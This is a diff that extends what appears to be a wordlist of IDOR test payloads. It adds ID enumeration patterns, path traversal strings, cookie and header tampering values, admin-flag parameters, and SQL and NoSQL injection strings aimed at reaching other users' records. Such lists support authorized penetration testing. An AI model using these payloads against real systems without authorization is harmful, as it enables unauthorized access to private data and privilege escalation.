@@ -38,3 +38,180 @@
 # Array/Multiple IDs
 ?id[]=1&id[]=2
 ?ids=1,2,3
+
+# HTTP Methods for IDOR
+GET /api/user/1
+POST /api/user/1
+PUT /api/user/1
+DELETE /api/user/1
+PATCH /api/user/1
+
+# Path-based IDOR
+/users/1/profile
+/users/2/profile
+/users/admin/profile
+/api/v1/users/1
+/api/v1/users/2
+/api/v2/user/1/settings
+/api/user/1/private
+/api/user/2/documents
+
+# Subdomain enumeration
+user1.example.com
+user2.example.com
+admin.example.com
+
+# GUID/UUID variations
+?id=00000000-0000-0000-0000-000000000000
+?id=ffffffff-ffff-ffff-ffff-ffffffffffff
+?id=12345678-1234-1234-1234-123456789012
+?uuid=a1b2c3d4-e5f6-4a5b-8c7d-9e0f1a2b3c4d
+
+# Base64 encoded IDs
+?id=MQ==
+?id=Mg==
+?id=YWRtaW4=
+?user=dXNlcjE=
+
+# Hash-based IDs
+?id=5f4dcc3b5aa765d61d8327deb882cf99
+?id=098f6bcd4621d373cade4e832627b4f6
+?token=abc123def456
+
+# Numeric variations
+?id=0001
+?id=0010
+?id=0100
+?id=1000
+?user_id=00001
+?customer_id=00100
+
+# Special characters in IDs
+?id=../1
+?id=../../2
+?id=..%2f1
+?id=%2e%2e%2f1
+
+# API endpoint variations
+/api/orders/1
+/api/orders/2
+/api/invoices/1
+/api/transactions/1
+/api/messages/1
+/api/posts/1/edit
+/api/comments/1/delete
+
+# Cookie-based IDOR
+Cookie: user_id=1
+Cookie: user_id=2
+Cookie: session_id=user1
+Cookie: account=1
+
+# Header-based IDOR
+X-User-Id: 1
+X-User-Id: 2
+X-Account-Id: 1
+X-Customer-Id: 2
+
+# JSON body IDOR
+{"user_id": 1}
+{"user_id": 2}
+{"account_id": 1}
+{"profile_id": 2}
+
+# Compound IDs
+?user_id=1&account_id=1
+?id=1&type=admin
+?user=1&role=admin
+
+# Email-based enumeration
+?email=user1@example.com
+?email=user2@example.com
+?email=admin@example.com
+?email=test@test.com
+
+# Phone number enumeration
+?phone=1234567890
+?phone=+11234567890
+?mobile=9876543210
+
+# Date-based IDs
+?date=2024-01-01
+?created_at=2024-01-01
+?year=2024&month=01&day=01
+
+# Predictable patterns
+?ref=INV-001
+?ref=INV-002
+?order=ORD-1000
+?order=ORD-1001
+?ticket=TKT-001
+
+# Encoded variations
+?id=1%00
+?id=1%0a
+?id=1%0d
+?id=1%20
+
+# Boolean values
+?admin=true
+?admin=false
+?is_admin=1
+?is_admin=0
+?superuser=true
+
+# Wildcard attempts
+?id=*
+?user=*
+?search=*
+
+# Negative numbers
+?id=-1
+?id=-10
+?id=-100
+?offset=-1
+
+# Large numbers
+?id=999999999
+?id=2147483647
+?id=9999999999999
+
+# Float/Decimal
+?id=1.0
+?id=1.5
+?amount=0.01
+
+# SQL-style injection in IDOR
+?id=1' OR '1'='1
+?id=1 OR 1=1
+?id=1 UNION SELECT * FROM users
+
+# NoSQL-style injection in IDOR
+?id[$ne]=1
+?id[$gt]=0
+?user[$regex]=admin
+
+# XML-style
+?id=<id>1</id>
+?user=<user>admin</user>
+
+# GraphQL IDOR
+?query={user(id:1){name,email}}
+?query={user(id:2){name,email}}
+
+# REST variations
+/users/me
+/users/self
+/users/current
+/users/1
+/users/2
+
+# Hyphenated IDs
+?id=user-1
+?id=account-2
+?ref=invoice-001
+
+# Underscore IDs
+?id=user_1
+?id=account_2
+?id=customer_001
